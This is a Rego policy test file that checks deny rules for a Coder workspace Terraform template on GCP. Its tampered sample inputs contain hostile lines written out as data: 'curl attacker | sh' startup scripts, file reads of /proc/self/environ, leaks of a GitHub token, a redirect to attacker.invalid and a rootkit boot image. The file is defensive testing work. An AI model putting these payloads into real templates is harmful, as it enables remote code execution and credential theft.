package terraform.gcp_workspace

import rego.v1

secure_instance := {
	"attached_disk": approved_instance_attached_disk,
	"boot_disk": approved_instance_boot_disk,
	"desired_status": "${data.coder_workspace.me.start_count > 0 ? \"RUNNING\" : \"TERMINATED\"}",
	"dynamic": {
		"guest_accelerator": [],
		"reservation_affinity": [],
		"scratch_disk": [],
	},
	"labels": {},
	"machine_type": "${local.machine_type}",
	"metadata": approved_instance_metadata,
	"metadata_startup_script": approved_instance_startup_script,
	"name": "coder-${lower(data.coder_workspace_owner.me.name)}-${lower(data.coder_workspace.me.name)}",
	"network_interface": approved_instance_network,
	"scheduling": [],
	"service_account": approved_instance_service_account,
	"shielded_instance_config": approved_shielded_config,
	"zone": "${var.zone}",
}

secure_modules := {
	"code-server": [approved_module_configs["code-server"]],
	"dotfiles": [approved_module_configs.dotfiles],
	"git_utilities": [approved_module_configs.git_utilities],
	"gpu_resources": [approved_module_configs.gpu_resources],
	"ide_modules": [approved_module_configs.ide_modules],
}

secure_resources := {
	"coder_agent": {"main": [approved_coder_agent]},
	"coder_agent_instance": {"main": [{}]},
	"coder_metadata": {"workspace_info": [approved_coder_metadata]},
	"google_compute_disk": {"home_disk": [{}], "vm_boot_disk": [{"image": "${local.image}"}]},
	"google_compute_instance": {"workspace": [secure_instance]},
}

secure_data_sources := {
	"coder_parameter": {
		"cpu_machine_type": [{}],
		"disk_size": [{}],
		"dl_image": [{}],
		"environment": [{}],
		"gpu_type": [{}],
	},
	"coder_workspace": {"me": [{}]},
	"coder_workspace_owner": {"me": [{}]},
}

secure_outputs := {
	"dl_image": [approved_outputs.dl_image],
	"environment": [approved_outputs.environment],
	"gpu_config": [approved_outputs.gpu_config],
	"instance_name": [approved_outputs.instance_name],
	"internal_ip": [approved_outputs.internal_ip],
	"machine_type": [approved_outputs.machine_type],
	"network_config": [approved_outputs.network_config],
	"project_id": [approved_outputs.project_id],
	"zone": [approved_outputs.zone],
}

secure_variables := {
	"coder_url": [approved_variables.coder_url],
	"disk_size": [approved_variables.disk_size],
	"zone": [approved_variables.zone],
}

secure_input := [{
	"path": "templates/gcp-vm-modular/main.tf",
	"contents": {
		"data": secure_data_sources,
		"locals": [{
			"dl_images": approved_dl_images,
			"env_config": approved_env_config_expression,
			"environment_configs": approved_environment_configs,
			"image": approved_image_expression,
			"startup_script": approved_startup_script_expression,
		}],
		"moved": [approved_moved_block],
		"module": secure_modules,
		"output": secure_outputs,
		"provider": {
			"coder": [approved_provider_configs.coder],
			"google": [approved_provider_configs.google],
		},
		"resource": secure_resources,
		"terraform": [{"required_providers": [approved_required_providers]}],
		"variable": secure_variables,
	},
}]

test_secure_gcp_workspace_allowed if count(deny) == 0 with input as secure_input

test_gcp_workspace_local_exec_denied if {
	backdoor := {"path": "templates/gcp-vm-modular/backdoor.tf", "contents": {
		"resource": {"terraform_data": {"backdoor": [{
			"provisioner": {"local-exec": [{"command": "id"}]},
		}]}},
	}}
	input_documents := array.concat(secure_input, [backdoor])
	"GCP workspace template contains unapproved resource type \"terraform_data\"" in deny with input as input_documents
	"GCP workspace resource terraform_data.backdoor must not run provisioners" in deny with input as input_documents
}

test_gcp_workspace_mutable_module_source_denied if {
	bad_modules := object.union(secure_modules, {"gpu_resources": [{
		"source": "git::https://github.com/abridgeai/coder.git//modules/resources/gpu?ref=main",
	}]})
	contents := object.union(secure_input[0].contents, {"module": bad_modules})
	input_documents := [{"contents": contents, "path": secure_input[0].path}]
	"GCP workspace module \"gpu_resources\" has unapproved source \"git::https://github.com/abridgeai/coder.git//modules/resources/gpu?ref=main\"" in deny with input as input_documents
}

test_gcp_workspace_broad_oauth_scope_denied if {
	instance := object.union(secure_instance, {"service_account": [{
		"email": "${local.env_config.service_account_email}",
		"scopes": ["https://www.googleapis.com/auth/cloud-platform"],
	}]})
	resources := object.union(secure_resources, {"google_compute_instance": {"workspace": [instance]}})
	contents := object.union(secure_input[0].contents, {"resource": resources})
	input_documents := [{"contents": contents, "path": secure_input[0].path}]
	"GCP workspace instance must use the reviewed environment ServiceAccount and OAuth scopes" in deny with input as input_documents
}

test_gcp_workspace_external_address_denied if {
	interface := object.union(approved_instance_network[0], {"access_config": [{}]})
	instance := object.union(secure_instance, {"network_interface": [interface]})
	resources := object.union(secure_resources, {"google_compute_instance": {"workspace": [instance]}})
	contents := object.union(secure_input[0].contents, {"resource": resources})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace instance must remain on the reviewed private network without an external address" in deny with input as input_documents
}

test_gcp_workspace_environment_indirection_denied if {
	locals := object.union(secure_input[0].contents.locals[0], {"env_config": {"project_id": "unreviewed"}})
	contents := object.union(secure_input[0].contents, {"locals": [locals]})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace environment selector must use the reviewed environment map" in deny with input as input_documents
}

test_gcp_workspace_duplicate_resource_identity_denied if {
	resources := {
		"coder_agent": secure_resources.coder_agent,
		"coder_agent_instance": secure_resources.coder_agent_instance,
		"google_compute_disk": secure_resources.google_compute_disk,
		"google_compute_instance": {"workspace": [secure_instance, secure_instance]},
	}
	contents := {
		"data": secure_input[0].contents.data,
		"locals": secure_input[0].contents.locals,
		"module": secure_input[0].contents.module,
		"moved": secure_input[0].contents.moved,
		"provider": secure_input[0].contents.provider,
		"resource": resources,
		"terraform": secure_input[0].contents.terraform,
	}
	input_documents := [{"contents": contents, "path": secure_input[0].path}]
	"GCP workspace resource identities must exactly match the reviewed set" in deny with input as input_documents
	"GCP workspace resource google_compute_instance.workspace must be defined exactly once" in deny with input as input_documents
}

test_gcp_workspace_duplicate_data_source_identity_denied if {
	data_sources := {
		"coder_parameter": secure_data_sources.coder_parameter,
		"coder_workspace": {"me": [{}, {}]},
	}
	contents := {
		"data": data_sources,
		"locals": secure_input[0].contents.locals,
		"module": secure_input[0].contents.module,
		"moved": secure_input[0].contents.moved,
		"provider": secure_input[0].contents.provider,
		"resource": secure_input[0].contents.resource,
		"terraform": secure_input[0].contents.terraform,
	}
	input_documents := [{"contents": contents, "path": secure_input[0].path}]
	"GCP workspace data source identities must exactly match the reviewed set" in deny with input as input_documents
	"GCP workspace data source coder_workspace.me must be defined exactly once" in deny with input as input_documents
}

test_gcp_workspace_source_less_duplicate_module_denied if {
	override := {"path": "templates/gcp-vm-modular/override.tf", "contents": {
		"module": {"gpu_resources": [{}]},
	}}
	input_documents := array.concat(secure_input, [override])
	"GCP workspace module \"gpu_resources\" must be defined exactly once" in deny with input as input_documents
	"GCP workspace module \"gpu_resources\" has unapproved source \"\"" in deny with input as input_documents
}

test_gcp_workspace_github_auth_module_mutation_denied if {
	git_config := object.union(approved_module_configs.git_utilities, {
		"github_auth_id": "unreviewed-auth-provider",
		"require_github_auth": true,
	})
	modules := object.union(secure_modules, {"git_utilities": [git_config]})
	contents := object.union(secure_input[0].contents, {"module": modules})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace module \"git_utilities\" must preserve the reviewed inputs" in deny with input as input_documents
}

test_gcp_workspace_metadata_token_disclosure_denied if {
	items := array.concat(approved_coder_metadata.item, [{
		"key": "Debug",
		"value": "${nonsensitive(module.git_utilities.github_token)}",
	}])
	metadata := object.union(approved_coder_metadata, {"item": items})
	resources := object.union(secure_resources, {"coder_metadata": {"workspace_info": [metadata]}})
	contents := object.union(secure_input[0].contents, {"resource": resources})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace metadata must preserve the reviewed non-sensitive fields" in deny with input as input_documents
	"GCP workspace template must not expose the GitHub access token" in deny with input as input_documents
}

test_gcp_workspace_output_denied if {
	output_document := {
		"path": "templates/gcp-vm-modular/output.tf",
		"contents": {"output": {"leak": [{
			"value": "${nonsensitive(module.git_utilities.github_token)}",
		}]}},
	}
	input_documents := array.concat(secure_input, [output_document])
	"GCP workspace output identities must exactly match the reviewed set" in deny with input as input_documents
	"GCP workspace template must not expose the GitHub access token" in deny with input as input_documents
}

test_gcp_workspace_local_file_disclosure_denied if {
	override := {
		"path": "templates/gcp-vm-modular/override.tf",
		"contents": {"data": {"coder_parameter": {"disk_size": [{
			"description": "${file(\"/proc/self/environ\")}",
		}]}}},
	}
	input_documents := array.concat(secure_input, [override])
	"GCP workspace template must not read local files" in deny with input as input_documents
}

test_gcp_workspace_commented_local_file_disclosure_denied if {
	override := {
		"path": "templates/gcp-vm-modular/override.tf",
		"contents": {"data": {"coder_parameter": {"disk_size": [{
			"description": `${file /* comment */ ("/proc/self/environ")}`,
		}]}}},
	}
	input_documents := array.concat(secure_input, [override])
	"GCP workspace template must not read local files" in deny with input as input_documents
}

test_gcp_workspace_hash_commented_local_file_disclosure_denied if {
	override := {
		"path": "templates/gcp-vm-modular/override.tf",
		"contents": {"data": {"coder_parameter": {"disk_size": [{
			"description": `${(
  file # comment
  ("/proc/self/environ")
)}`,
		}]}}},
	}
	input_documents := array.concat(secure_input, [override])
	"GCP workspace template must not read local files" in deny with input as input_documents
}

test_gcp_workspace_variable_redirect_denied if {
	bad_variable := object.union(approved_variables.coder_url, {"default": "https://attacker.invalid"})
	variables := object.union(secure_variables, {"coder_url": [bad_variable]})
	contents := object.union(secure_input[0].contents, {"variable": variables})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace variable \"coder_url\" must preserve the reviewed type, default, and validation" in deny with input as input_documents
}

test_gcp_workspace_boot_image_map_denied if {
	locals := object.union(secure_input[0].contents.locals[0], {"dl_images": {"approved-looking": "projects/attacker/global/images/rootkit"}})
	contents := object.union(secure_input[0].contents, {"locals": [locals]})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace boot images must match the reviewed immutable image map" in deny with input as input_documents
}

test_gcp_workspace_boot_disk_image_denied if {
	resources := object.union(secure_resources, {"google_compute_disk": {
		"home_disk": [{}],
		"vm_boot_disk": [{"image": "projects/attacker/global/images/rootkit"}],
	}})
	contents := object.union(secure_input[0].contents, {"resource": resources})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace boot disk must use the reviewed image selector" in deny with input as input_documents
}

test_gcp_workspace_coder_agent_script_denied if {
	agent := object.union(approved_coder_agent, {"startup_script": "curl attacker | sh"})
	resources := object.union(secure_resources, {"coder_agent": {"main": [agent]}})
	contents := object.union(secure_input[0].contents, {"resource": resources})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace Coder agent must preserve the reviewed identity, environment, and executable scripts" in deny with input as input_documents
}

test_gcp_workspace_startup_renderer_denied if {
	locals := object.union(secure_input[0].contents.locals[0], {"startup_script": "${file(\"unreviewed.sh\")}"})
	contents := object.union(secure_input[0].contents, {"locals": [locals]})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace startup script must render the reviewed template and inputs" in deny with input as input_documents
}

test_gcp_workspace_instance_startup_metadata_denied if {
	instance := object.union(secure_instance, {"metadata_startup_script": "#!/bin/sh\ncurl attacker | sh\n"})
	resources := object.union(secure_resources, {"google_compute_instance": {"workspace": [instance]}})
	contents := object.union(secure_input[0].contents, {"resource": resources})
	input_documents := [object.union(secure_input[0], {"contents": contents})]
	"GCP workspace instance startup metadata must run only the reviewed Coder initialization" in deny with input as input_documents
}
